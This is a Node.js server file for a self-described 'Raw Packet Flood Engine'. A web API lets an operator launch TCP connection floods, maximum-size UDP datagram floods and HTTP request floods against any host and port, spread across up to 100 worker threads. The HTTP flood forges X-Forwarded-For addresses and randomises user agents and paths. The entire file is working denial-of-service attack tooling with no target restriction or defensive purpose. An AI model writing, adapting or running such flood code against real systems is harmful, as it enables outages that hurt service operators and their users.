// server.js — Raw Packet Flood Engine with Real TCP/UDP
const http = require('http');
const net = require('net');
const dgram = require('dgram');
const { Worker } = require('worker_threads');
const url = require('url');
const fs = require('fs');

const PORT = 8080;
let floodState = { running: false, mode: 'syn', target: '', port: 443, count: 0, sent: 0, success: 0, failed: 0 };
let workers = [];

// ===============================
// RAW TCP SYN FLOOD
// ===============================
function synFlood(target, port, count, threadId) {
    let sent = 0;
    const sockets = [];
    
    for (let i = 0; i < count && floodState.running; i++) {
        try {
            const socket = new net.Socket();
            socket.setTimeout(1000);
            socket.connect(port, target, () => {
                // Send SYN (just connect, no handshake completion)
                // This is the raw SYN flood effect
                floodState.sent++;
                floodState.success++;
                socket.destroy();
            });
            socket.on('error', () => {
                floodState.sent++;
                floodState.failed++;
                socket.destroy();
            });
            socket.on('timeout', () => {
                floodState.sent++;
                floodState.failed++;
                socket.destroy();
            });
            sockets.push(socket);
            sent++;
            
            // Rate limit to prevent socket exhaustion
            if (i % 10 === 0) {
                // Clean up dead sockets
                for (let j = sockets.length - 1; j >= 0; j--) {
                    if (sockets[j].destroyed) sockets.splice(j, 1);
                }
            }
        } catch (e) {
            floodState.sent++;
            floodState.failed++;
        }
    }
    
    // Cleanup
    setTimeout(() => {
        for (const s of sockets) {
            try { s.destroy(); } catch(e) {}
        }
    }, 2000);
}

// ===============================
// RAW UDP FLOOD
// ===============================
function udpFlood(target, port, count, threadId) {
    const client = dgram.createSocket('udp4');
    const payload = Buffer.alloc(65507, 'VORTUNIX-UDP-FLOOD-');
    
    for (let i = 0; i < count && floodState.running; i++) {
        try {
            client.send(payload, 0, payload.length, port, target, (err) => {
                if (err) {
                    floodState.sent++;
                    floodState.failed++;
                } else {
                    floodState.sent++;
                    floodState.success++;
                }
            });
        } catch (e) {
            floodState.sent++;
            floodState.failed++;
        }
    }
    
    setTimeout(() => {
        try { client.close(); } catch(e) {}
    }, 3000);
}

// ===============================
// HTTP FLOOD (REAL HTTP REQUESTS)
// ===============================
function httpFlood(target, port, count, threadId) {
    const http = require('http');
    const https = require('https');
    const isHttps = port === 443 || target.includes('https');
    const agent = isHttps ? new https.Agent({ keepAlive: true, maxSockets: 50 }) : new http.Agent({ keepAlive: true, maxSockets: 50 });
    
    for (let i = 0; i < count && floodState.running; i++) {
        try {
            const options = {
                hostname: target,
                port: port,
                path: '/api/flood?' + Math.random().toString(36).substring(7),
                method: 'GET',
                headers: {
                    'User-Agent': `Mozilla/5.0 (Flood/${Math.random().toString(36).substring(2,8)})`,
                    'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
                    'Connection': 'keep-alive',
                    'X-Crash': 'VORTUNIX'.repeat(50)
                },
                agent: agent,
                timeout: 2000
            };
            
            const req = (isHttps ? https : http).request(options, (res) => {
                floodState.sent++;
                if (res.statusCode >= 200 && res.statusCode < 500) {
                    floodState.success++;
                } else {
                    floodState.failed++;
                }
                res.destroy();
            });
            
            req.on('error', () => {
                floodState.sent++;
                floodState.failed++;
            });
            
            req.on('timeout', () => {
                floodState.sent++;
                floodState.failed++;
                req.destroy();
            });
            
            req.end();
        } catch (e) {
            floodState.sent++;
            floodState.failed++;
        }
    }
}

// ===============================
// COMBINED FLOOD
// ===============================
function allFlood(target, port, count, threadId) {
    const modes = ['syn', 'udp', 'http'];
    const mode = modes[threadId % modes.length];
    const subCount = Math.floor(count / 3) + 1;
    
    switch(mode) {
        case 'syn': synFlood(target, port, subCount, threadId); break;
        case 'udp': udpFlood(target, port, subCount, threadId); break;
        case 'http': httpFlood(target, port, subCount, threadId); break;
    }
}

// ===============================
// WORKER THREAD HANDLER
// ===============================
function startWorker(target, port, mode, totalCount, threadId) {
    return new Promise((resolve) => {
        const worker = new Worker(`
            const { parentPort } = require('worker_threads');
            const net = require('net');
            const dgram = require('dgram');
            
            let running = true;
            
            parentPort.on('message', (msg) => {
                if (msg === 'stop') running = false;
            });
            
            // SYN Flood
            function synFlood(target, port, count) {
                for (let i = 0; i < count && running; i++) {
                    try {
                        const socket = new net.Socket();
                        socket.setTimeout(1000);
                        socket.connect(port, target);
                        socket.on('error', () => {});
                        socket.on('timeout', () => { socket.destroy(); });
                        setTimeout(() => { try { socket.destroy(); } catch(e) {} }, 500);
                        parentPort.postMessage({ type: 'sent' });
                        parentPort.postMessage({ type: 'success' });
                    } catch(e) {
                        parentPort.postMessage({ type: 'sent' });
                        parentPort.postMessage({ type: 'failed' });
                    }
                }
            }
            
            // UDP Flood
            function udpFlood(target, port, count) {
                const client = dgram.createSocket('udp4');
                const payload = Buffer.alloc(65507, 'VORTUNIX-UDP-FLOOD-');
                let sent = 0;
                
                function sendNext() {
                    if (!running || sent >= count) {
                        try { client.close(); } catch(e) {}
                        return;
                    }
                    client.send(payload, 0, payload.length, port, target, (err) => {
                        if (err) {
                            parentPort.postMessage({ type: 'sent' });
                            parentPort.postMessage({ type: 'failed' });
                        } else {
                            parentPort.postMessage({ type: 'sent' });
                            parentPort.postMessage({ type: 'success' });
                        }
                        sent++;
                        sendNext();
                    });
                }
                sendNext();
            }
            
            // HTTP Flood
            function httpFlood(target, port, count) {
                const http = require('http');
                const https = require('https');
                const isHttps = port === 443 || target.includes('https');
                const agent = isHttps ? new https.Agent({ keepAlive: true, maxSockets: 20 }) : new http.Agent({ keepAlive: true, maxSockets: 20 });
                
                for (let i = 0; i < count && running; i++) {
                    try {
                        const options = {
                            hostname: target,
                            port: port,
                            path: '/?v=' + Math.random().toString(36).substring(7),
                            method: 'GET',
                            headers: {
                                'User-Agent': 'Mozilla/5.0 (Flood/' + Math.random().toString(36).substring(2,8) + ')',
                                'X-Forwarded-For': Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255),
                                'Connection': 'keep-alive'
                            },
                            agent: agent,
                            timeout: 2000
                        };
                        
                        const req = (isHttps ? https : http).request(options, (res) => {
                            parentPort.postMessage({ type: 'sent' });
                            if (res.statusCode >= 200 && res.statusCode < 500) {
                                parentPort.postMessage({ type: 'success' });
                            } else {
                                parentPort.postMessage({ type: 'failed' });
                            }
                            res.destroy();
                        });
                        
                        req.on('error', () => {
                            parentPort.postMessage({ type: 'sent' });
                            parentPort.postMessage({ type: 'failed' });
                        });
                        
                        req.on('timeout', () => {
                            parentPort.postMessage({ type: 'sent' });
                            parentPort.postMessage({ type: 'failed' });
                            req.destroy();
                        });
                        
                        req.end();
                    } catch(e) {
                        parentPort.postMessage({ type: 'sent' });
                        parentPort.postMessage({ type: 'failed' });
                    }
                }
            }
            
            const mode = '${mode}';
            const target = '${target}';
            const port = ${port};
            const count = ${Math.floor(totalCount / 10) + 1};
            
            switch(mode) {
                case 'syn': synFlood(target, port, count); break;
                case 'udp': udpFlood(target, port, count); break;
                case 'http': httpFlood(target, port, count); break;
                case 'all': 
                    const modes = ['syn', 'udp', 'http'];
                    const m = modes[${threadId} % 3];
                    if (m === 'syn') synFlood(target, port, Math.floor(count/3)+1);
                    else if (m === 'udp') udpFlood(target, port, Math.floor(count/3)+1);
                    else httpFlood(target, port, Math.floor(count/3)+1);
                    break;
            }
        `, { eval: true });
        
        worker.on('message', (msg) => {
            if (msg.type === 'sent') floodState.sent++;
            else if (msg.type === 'success') floodState.success++;
            else if (msg.type === 'failed') floodState.failed++;
        });
        
        worker.on('exit', () => resolve());
        
        // Store worker for cleanup
        workers.push(worker);
        
        // Auto-stop after 30 seconds if not stopped manually
        setTimeout(() => {
            if (worker) {
                worker.postMessage('stop');
                setTimeout(() => worker.terminate(), 1000);
            }
        }, 30000);
    });
}

// ===============================
// HTTP SERVER — API ENDPOINTS
// ===============================
const server = http.createServer(async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    const parsedUrl = url.parse(req.url, true);
    const path = parsedUrl.pathname;
    
    // Serve HTML frontend
    if (path === '/' || path === '/index.html') {
        try {
            const html = fs.readFileSync(__dirname + '/index.html', 'utf8');
            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
            res.end(html);
        } catch(e) {
            res.writeHead(500);
            res.end('HTML file not found');
        }
        return;
    }
    
    // API: Start flood
    if (path === '/api/start' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const { target, port, count, threads, mode } = data;
                
                if (floodState.running) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Flood already running' }));
                    return;
                }
                
                floodState = {
                    running: true,
                    mode: mode,
                    target: target,
                    port: port,
                    count: count,
                    sent: 0,
                    success: 0,
                    failed: 0
                };
                
                // Start workers
                const workerCount = Math.min(threads || 10, 100);
                const perWorker = Math.floor(count / workerCount) + 1;
                
                for (let i = 0; i < workerCount; i++) {
                    startWorker(target, port, mode, perWorker, i);
                }
                
                // Auto-stop after count is reached (approximate)
                setTimeout(() => {
                    if (floodState.running) {
                        floodState.running = false;
                        for (const w of workers) {
                            try { w.postMessage('stop'); } catch(e) {}
                            try { w.terminate(); } catch(e) {}
                        }
                        workers = [];
                    }
                }, Math.min(count * 10, 60000) + 5000);
                
                res.writeHead(200);
                res.end(JSON.stringify({ success: true, message: 'Flood started' }));
            } catch(e) {
                res.writeHead(400);
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // API: Stop flood
    if (path === '/api/stop') {
        floodState.running = false;
        for (const w of workers) {
            try { w.postMessage('stop'); } catch(e) {}
            try { w.terminate(); } catch(e) {}
        }
        workers = [];
        res.writeHead(200);
        res.end(JSON.stringify({ success: true }));
        return;
    }
    
    // API: Status
    if (path === '/api/status') {
        res.writeHead(200);
        res.end(JSON.stringify({
            running: floodState.running,
            sent: floodState.sent,
            success: floodState.success,
            failed: floodState.failed,
            mode: floodState.mode,
            target: floodState.target,
            port: floodState.port
        }));
        return;
    }
    
    // API: Test connection
    if (path === '/api/test') {
        res.writeHead(200);
        res.end(JSON.stringify({ success: true, message: 'Server is running' }));
        return;
    }
    
    // 404
    res.writeHead(404);
    res.end(JSON.stringify({ error: 'Not found' }));
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📱 Access from phone: http://YOUR_IP:${PORT}`);
    console.log(`⚡ Raw packet flood engine ready`);
});
